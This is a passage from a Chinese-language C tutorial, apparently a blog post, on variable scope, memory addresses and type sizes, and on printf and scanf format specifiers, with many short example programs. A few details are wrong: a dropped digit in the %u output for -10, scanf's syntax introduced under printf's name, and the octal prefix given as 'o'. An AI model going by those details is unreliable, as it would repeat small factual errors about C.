<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">998</span>; <span class="comment">// 作用域开始</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">// 作用域结束</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">998</span>; <span class="comment">// 作用域开始</span></span><br><span class="line">    &#125;<span class="comment">// 作用域结束</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i); <span class="comment">// 不能使用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">998</span>;<span class="comment">// 作用域开始</span></span><br><span class="line">        &#125;<span class="comment">// 作用域结束</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i); <span class="comment">// 不能使用</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>全局变量<ul>
<li>全局变量也称为外部变量,它是在代码块外部定义的变量</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">666</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i); <span class="comment">// 可以使用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">// 作用域结束</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i); <span class="comment">// 可以使用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>注意点:<ul>
<li>同一作用域范围内不能有相同名称的变量</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">998</span>; <span class="comment">// 作用域开始</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">666</span>; <span class="comment">// 报错, 重复定义</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">// 作用域结束</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">666</span>; </span><br><span class="line"><span class="keyword">int</span> i = <span class="number">998</span>; <span class="comment">// 报错, 重复定义</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>不同作用域范围内可以有相同名称的变量</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">666</span>; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">998</span>; <span class="comment">// 不会报错</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">998</span>; <span class="comment">// 不会报错</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">666</span>;  <span class="comment">// 不会报错</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="变量内存分析（简单版）"><a href="#变量内存分析（简单版）" class="headerlink" title="变量内存分析（简单版）"></a>变量内存分析（简单版）</h2><ul>
<li>字节和地址<ul>
<li>为了更好地理解变量在内存中的存储细节，先来认识一下内存中的“字节”和“地址”</li>
<li><em><strong>每一个小格子代表一个字节</strong></em></li>
<li><em><strong>每个字节都有自己的内存地址</strong></em></li>
<li><em><strong>内存地址是连续的</strong></em></li>
</ul>
</li>
</ul>
<p><img src="/2022/01/15/C/5515a7f3bbb5194db1f67b4f98de31c5.png" alt="img"></p>
<ul>
<li>变量存储占用的空间<ul>
<li>一个变量所占用的存储空间，和<em><strong>定义变量时声明的类型</strong></em>以及<em><strong>当前编译环境</strong></em>有关</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center"><strong>类型</strong></th>
<th align="center"><strong>16位编译器</strong></th>
<th align="center"><strong>32位编译器</strong></th>
<th align="center"><strong>64位编译器</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">char</td>
<td align="center">1</td>
<td align="center">1</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">int</td>
<td align="center">2</td>
<td align="center">4</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">float</td>
<td align="center">4</td>
<td align="center">4</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">double</td>
<td align="center">8</td>
<td align="center">8</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">short</td>
<td align="center">2</td>
<td align="center">2</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">long</td>
<td align="center">4</td>
<td align="center">4</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">long long</td>
<td align="center">8</td>
<td align="center">8</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">void*</td>
<td align="center">2</td>
<td align="center">4</td>
<td align="center">8</td>
</tr>
</tbody></table>
<p>变量存储的过程</p>
<ul>
<li>根据定义变量时声明的类型和当前编译环境确定需要开辟多大存储空间</li>
<li>在内存中开辟一块存储空间，开辟时从内存地址大的开始开辟（内存寻址从大到小）</li>
<li>将数据保存到已经开辟好的对应内存空间中</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> number;</span><br><span class="line">  <span class="keyword">int</span> value;</span><br><span class="line">  number = <span class="number">22</span>;</span><br><span class="line">  value = <span class="number">666</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    number = <span class="number">22</span>;</span><br><span class="line">    value = <span class="number">666</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;number = %p\n&quot;</span>, &amp;number); <span class="comment">// 0060FEAC</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;value = %p\n&quot;</span>, &amp;value);   <span class="comment">// 0060FEA8</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/15/C/3ac2c92b7d317d38441f3948865d98d0.png" alt="img"></p>
<blockquote>
<p>先不要着急, 刚开始接触C语言, 先了解这么多就够了. 后面会再次更深入的讲述存储的各种细节。</p>
</blockquote>
<h2 id="printf函数"><a href="#printf函数" class="headerlink" title="printf函数"></a>printf函数</h2><p><img src="/2022/01/15/C/1a1d70de9ee22c638b43de8009048570-164225816352510.png" alt="img"></p>
<ul>
<li>printf函数称之为格式输出函数,方法名称的最后一个字母f表示format。其功能是按照用户指定的格式,把指定的数据输出到屏幕上</li>
<li>printf函数的调用格式为:<ul>
<li>printf(“格式控制字符串”,输出项列表 );</li>
<li>例如:printf(“a = %d, b = %d”,a, b);</li>
</ul>
</li>
</ul>
<p><img src="/2022/01/15/C/30dae0fb7fa2f93706031066d3cd99cf.png" alt="img"></p>
<ul>
<li><p>非格式字符串原样输出, 格式控制字符串会被输出项列表中的数据替换</p>
</li>
<li><p>注意: 格式控制字符串和输出项在数量和类型上<em><strong>必须一一对应</strong></em></p>
</li>
<li><p>格式控制字符串</p>
<ul>
<li>形式: <code>%[标志][输出宽度][.精度][长度]类型</code></li>
</ul>
</li>
<li><p>类型</p>
<ul>
<li>格式: <code>printf(&quot;a = %类型&quot;, a);</code></li>
<li>类型字符串用以表示输出数据的类型, 其格式符和意义如下所示</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center"><strong>类型</strong></th>
<th align="center"><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">d</td>
<td align="center">有符号10进制整型</td>
</tr>
<tr>
<td align="center">i</td>
<td align="center">有符号10进制整型</td>
</tr>
<tr>
<td align="center">u</td>
<td align="center">无符号10进制整型</td>
</tr>
<tr>
<td align="center">o</td>
<td align="center">无符号8进制整型</td>
</tr>
<tr>
<td align="center">x</td>
<td align="center">无符号16进制整型</td>
</tr>
<tr>
<td align="center">X</td>
<td align="center">无符号16进制整型</td>
</tr>
<tr>
<td align="center">f</td>
<td align="center">单、双精度浮点数(默认保留6位小数)</td>
</tr>
<tr>
<td align="center">e / E</td>
<td align="center">以指数形式输出单、双精度浮点数</td>
</tr>
<tr>
<td align="center">g / G</td>
<td align="center">以最短输出宽度,输出单、双精度浮点数</td>
</tr>
<tr>
<td align="center">c</td>
<td align="center">字符</td>
</tr>
<tr>
<td align="center">s</td>
<td align="center">字符串</td>
</tr>
<tr>
<td align="center">p</td>
<td align="center">地址</td>
</tr>
</tbody></table>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">-10</span>;</span><br><span class="line">    <span class="keyword">float</span> c = <span class="number">6.6f</span>;</span><br><span class="line">    <span class="keyword">double</span> d = <span class="number">3.1415926</span>;</span><br><span class="line">    <span class="keyword">double</span> e = <span class="number">10.10</span>;</span><br><span class="line">    <span class="keyword">char</span> f = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="comment">// 有符号整数(可以输出负数)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d\n&quot;</span>, a); <span class="comment">// 10</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %i\n&quot;</span>, a); <span class="comment">// 10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无符号整数(不可以输出负数)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %u\n&quot;</span>, a); <span class="comment">// 10</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b = %u\n&quot;</span>, b); <span class="comment">// 429496786</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无符号八进制整数(不可以输出负数)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %o\n&quot;</span>, a); <span class="comment">// 12</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b = %o\n&quot;</span>, b); <span class="comment">// 37777777766</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无符号十六进制整数(不可以输出负数)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %x\n&quot;</span>, a); <span class="comment">// a</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b = %x\n&quot;</span>, b); <span class="comment">// fffffff6</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无符号十六进制整数(不可以输出负数)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %X\n&quot;</span>, a); <span class="comment">// A</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b = %X\n&quot;</span>, b); <span class="comment">// FFFFFFF6</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 单、双精度浮点数(默认保留6位小数)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c = %f\n&quot;</span>, c); <span class="comment">// 6.600000</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;d = %lf\n&quot;</span>, d); <span class="comment">// 3.141593</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以指数形式输出单、双精度浮点数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;e = %e\n&quot;</span>, e); <span class="comment">// 1.010000e+001</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;e = %E\n&quot;</span>, e); <span class="comment">// 1.010000E+001</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 以最短输出宽度,输出单、双精度浮点数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;e = %g\n&quot;</span>, e); <span class="comment">// 10.1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;e = %G\n&quot;</span>, e); <span class="comment">// 10.1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 输出字符</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;f = %c\n&quot;</span>, f); <span class="comment">// a</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>宽度<ul>
<li>格式: <code>printf(&quot;a = %[宽度]类型&quot;, a);</code></li>
<li>用十进制整数来指定输出的宽度, 如果实际位数多于指定宽度,则按照实际位数输出, 如果实际位数少于指定宽度则以空格补位</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 实际位数小于指定宽度</span></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a =|%d|\n&quot;</span>, a); <span class="comment">// |1|</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a =|%5d|\n&quot;</span>, a); <span class="comment">// |    1|</span></span><br><span class="line">    <span class="comment">// 实际位数大于指定宽度</span></span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">1234567</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b =|%d|\n&quot;</span>, b); <span class="comment">// |1234567|</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b =|%5d|\n&quot;</span>, b); <span class="comment">// |1234567|</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>标志<ul>
<li>格式: <code>printf(&quot;a = %[标志][宽度]类型&quot;, a);</code></li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center"><strong>标志</strong></th>
<th align="center"><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">-</td>
<td align="center">左对齐, 默认右对齐</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">当输出值为正数时,在输出值前面加上一个+号, 默认不显示</td>
</tr>
<tr>
<td align="center">0</td>
<td align="center">右对齐时, 用0填充宽度.(默认用空格填充)</td>
</tr>
<tr>
<td align="center">空格</td>
<td align="center">输出值为正数时,在输出值前面加上空格, 为负数时加上负号</td>
</tr>
<tr>
<td align="center">#</td>
<td align="center">对c、s、d、u类型无影响</td>
</tr>
<tr>
<td align="center">#</td>
<td align="center">对o类型, 在输出时加前缀o</td>
</tr>
<tr>
<td align="center">#</td>
<td align="center">对x类型,在输出时加前缀0x</td>
</tr>
</tbody></table>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// -号标志</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a =|%d|\n&quot;</span>, a); <span class="comment">// |1|</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a =|%5d|\n&quot;</span>, a); <span class="comment">// |    1|</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a =|%-5d|\n&quot;</span>, a);<span class="comment">// |1    |</span></span><br><span class="line">    <span class="comment">// +号标志</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a =|%d|\n&quot;</span>, a); <span class="comment">// |1|</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a =|%+d|\n&quot;</span>, a);<span class="comment">// |+1|</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b =|%d|\n&quot;</span>, b); <span class="comment">// |-1|</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b =|%+d|\n&quot;</span>, b);<span class="comment">// |-1|</span></span><br><span class="line">    <span class="comment">// 0标志</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a =|%5d|\n&quot;</span>, a); <span class="comment">// |    1|</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a =|%05d|\n&quot;</span>, a); <span class="comment">// |00001|</span></span><br><span class="line">    <span class="comment">// 空格标志</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a =|% d|\n&quot;</span>, a); <span class="comment">// | 1|</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b =|% d|\n&quot;</span>, b); <span class="comment">// |-1|</span></span><br><span class="line">    <span class="comment">// #号</span></span><br><span class="line">    <span class="keyword">int</span> c = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c = %o\n&quot;</span>, c); <span class="comment">// 12</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c = %#o\n&quot;</span>, c); <span class="comment">// 012</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c = %x\n&quot;</span>, c); <span class="comment">// a</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c = %#x\n&quot;</span>, c); <span class="comment">// 0xa</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>精度<ul>
<li>格式: <code>printf(&quot;a = %[精度]类型&quot;, a);</code></li>
<li>精度格式符以”.”开头, 后面跟上十进制整数, 用于指定需要输出多少位小数, 如果输出位数大于指定的精度, 则删除超出的部分</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">3.1415926</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %.2f\n&quot;</span>, a); <span class="comment">// 3.14</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>动态指定保留小数位数<ul>
<li>格式: <code>printf(&quot;a = %.*f&quot;, a);</code></li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">3.1415926</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %.*f&quot;</span>, <span class="number">2</span>, a); <span class="comment">// 3.14</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>实型(浮点类型)有效位数问题<ul>
<li>对于单精度数,使用%f格式符输出时,仅前6~7位是有效数字</li>
<li>对于双精度数,使用%lf格式符输出时,前15~16位是有效数字</li>
<li>有效位数和精度(保留多少位)不同, 有效位数是指从第一个非零数字开始,误差不超过本数位半个单位的、精确可信的数位</li>
<li>有效位数包含小数点前的非零数位</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//        1234.567871093750000</span></span><br><span class="line">    <span class="keyword">float</span> a = <span class="number">1234.567890123456789</span>;</span><br><span class="line">    <span class="comment">//         1234.567890123456900</span></span><br><span class="line">    <span class="keyword">double</span> b = <span class="number">1234.567890123456789</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %.15f\n&quot;</span>, a); <span class="comment">// 前8位数字是准确的, 后面的都不准确</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b = %.15f\n&quot;</span>, b); <span class="comment">// 前16位数字是准确的, 后面的都不准确</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>长度<ul>
<li>格式: <code>printf(&quot;a = %[长度]类型&quot;, a);</code></li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center"><strong>长度</strong></th>
<th align="center"><strong>修饰类型</strong></th>
<th align="center"><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">hh</td>
<td align="center">d、i、o、u、x</td>
<td align="center">输出char</td>
</tr>
<tr>
<td align="center">h</td>
<td align="center">d、i、o、u、x</td>
<td align="center">输出 short int</td>
</tr>
<tr>
<td align="center">l</td>
<td align="center">d、i、o、u、x</td>
<td align="center">输出 long int</td>
</tr>
<tr>
<td align="center">ll</td>
<td align="center">d、i、o、u、x</td>
<td align="center">输出 long long int</td>
</tr>
</tbody></table>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">short</span> <span class="keyword">int</span> b = <span class="number">123</span>;</span><br><span class="line">    <span class="keyword">int</span>  c = <span class="number">123</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> d = <span class="number">123</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> e = <span class="number">123</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %hhd\n&quot;</span>, a); <span class="comment">// 97</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b = %hd\n&quot;</span>, b); <span class="comment">// 123</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c = %d\n&quot;</span>, c); <span class="comment">// 123</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;d = %ld\n&quot;</span>, d); <span class="comment">// 123</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;e = %lld\n&quot;</span>, e); <span class="comment">// 123</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>转义字符<ul>
<li>格式: <code>printf(&quot;%f%%&quot;, 3.1415);</code></li>
<li>%号在格式控制字符串中有特殊含义, 所以想输出%必须添加一个转移字符</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f%%&quot;</span>, <span class="number">3.1415</span>); <span class="comment">// 输出结果3.1415%</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="scanf函数"><a href="#scanf函数" class="headerlink" title="scanf函数"></a>scanf函数</h2><ul>
<li><p>scanf函数用于接收键盘输入的内容, 是一个阻塞式函数,程序会停在scanf函数出现的地方, 直到接收到数据才会执行后面的代码</p>
</li>
<li><p>printf函数的调用格式为:</p>
<ul>
<li><code>scanf(&quot;格式控制字符串&quot;, 地址列表);</code></li>
<li>例如: <code>scanf(&quot;%d&quot;, &amp;num);</code></li>
</ul>
</li>
<li><p>基本用法</p>
<ul>
<li>地址列表项中只能传入变量地址, 变量地址可以通过&amp;符号+变量名称的形式获取</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;number); <span class="comment">// 接收一个整数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number = %d\n&quot;</span>, number); </span><br><span class="line">&#125;</span><br><span class="line">c</span><br></pre></td></tr></table></figure>

<ul>
<li>接收非字符和字符串类型时, 空格、Tab和回车会被忽略</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> num;</span><br><span class="line">    <span class="comment">// 例如:输入 Tab 空格 回车 回车 Tab 空格 3.14 , 得到的结果还是3.14</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>, &amp;num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num = %f\n&quot;</span>, num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>非格式字符串原样输入, 格式控制字符串会赋值给地址项列表项中的变量<ul>
<li>不推荐这种写法</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line">    <span class="comment">// 用户必须输入number = 数字  , 否则会得到一个意外的值</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;number = %d&quot;</span>, &amp;number);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number = %d\n&quot;</span>, number);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>接收多条数据<ul>
<li>格式控制字符串和地址列表项在数量和类型上必须一一对应</li>
<li>非字符和字符串情况下如果没有指定多条数据的分隔符, 可以使用空格或者回车作为分隔符(不推荐这种写法)</li>
<li>非字符和字符串情况下建议明确指定多条数据之间分隔符</li>
</ul>
</li>
</ul>
